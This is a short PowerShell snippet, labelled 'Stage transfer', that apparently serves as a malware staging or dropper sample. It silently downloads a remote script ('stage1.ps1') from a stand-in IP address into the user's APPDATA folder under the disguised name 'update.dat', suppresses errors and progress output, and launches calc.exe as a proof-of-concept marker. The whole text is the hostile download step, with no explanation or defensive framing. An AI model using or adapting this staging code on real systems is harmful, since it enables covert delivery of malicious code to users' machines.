
<# Stage transfer #> $TransferUrl = "http://192.0.2.21/stage1.ps1"; $Stage2Path = "$env:APPDATA\update.dat"; Start-BitsTransfer -Source $TransferUrl -Destination $Stage2Path -ErrorAction SilentlyContinue; & "calc.exe"; $ProgressPreference = "SilentlyContinue"
